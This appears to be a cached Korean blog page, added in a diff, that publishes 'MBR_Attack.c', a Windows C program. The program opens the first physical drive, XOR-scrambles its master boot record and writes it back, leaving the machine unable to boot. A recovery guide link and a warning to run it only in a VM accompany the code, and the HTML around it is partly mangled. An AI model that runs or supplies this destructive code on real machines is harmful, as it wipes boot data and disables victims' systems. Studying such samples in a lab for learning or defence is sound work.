@@ -1,0 +1,79 @@
+I"�<h3 id="mbr-복구-가이드docx-다운로드">MBR 복구 가이드.docx 다운로드</h3>
+<ul>
+  <li><a href="https://drive.google.com/file/d/1q-e2zcNb9uZIjoW_aDBhCFGWyRMBWnoz/view?usp=sharing">클릭</a>
+<br />
+————————-
+<br />
+```
+/*
+MBR_Attack.c (ver. 2020/11/17)
+by 최광석</li>
+</ul>
+
+<p><em>** 주의 : 반드시 VM에서만 실행해야 하며 실행 전 스냅샷을 촬영할 것 **</em>
+<em>** 짝수 단위로 실행하면 MBR이 원상복구 되니 이 점 참고할 것 **</em></p>
+
+<p>OS가 설치된 디스크에 접근하여 MBR을 XOR 암호화하는 방식으로 변조 후 강제종료시켜 더 이상 부팅을 할 수 없게 만듦.</p>
+
+<p>(+ ver. 20.11.17)</p>
+<ul>
+  <li>
+    <p>MBR 변조 후 즉시 재부팅하는 기능 추가</p>
+  </li>
+  <li>커스텀 부트로더를 만들어보려했으나.. 능력 부족으로 실패… ㅠㅠ</li>
+  <li>복구 가이드 작성에 주력해야할듯 (목 or 금에 완료 예정)
+*/</li>
+</ul>
+
+<p>#include <stdio.h>
+#include <windows.h></windows.h></stdio.h></p>
+
+<p>#define MAX_LINE 512</p>
+
+<p>// AttackMBR()
+// 물리 드라이브에 접근하여 MBR 변조
+// 변조는 XOR 암호화를 사용하였음</p>
+
+<p>int AttackMBR() {
+	HANDLE hDisk;
+	DWORD readn = 0;
+	BYTE MBR[MAX_LINE];</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hDisk = CreateFile(L"\\\\.\\PhysicalDrive0",
+	GENERIC_READ | GENERIC_WRITE,
+	0,
+	0,
+	OPEN_EXISTING,
+	0,
+	0);
+
+if (hDisk == INVALID_HANDLE_VALUE) {
+	printf("This Drive coulnd't be opened.\n");
+	CloseHandle(hDisk);
+	return 0;
+}
+
+ReadFile(hDisk, MBR, MAX_LINE, &amp;readn, 0);
+
+for (int i = 0; i &lt; MAX_LINE; i++) {
+	MBR[i] ^= i % 0xFF;
+}
+
+SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
+
+WriteFile(hDisk, MBR, MAX_LINE, &amp;readn, 0);
+
+CloseHandle(hDisk);
+</code></pre></div></div>
+
+<p>//	system(“shutdown -r -t 0”);</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return 0; }
+</code></pre></div></div>
+
+<p>int main() {
+	AttackMBR();</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return 0; } ```
+</code></pre></div></div>
+:ET
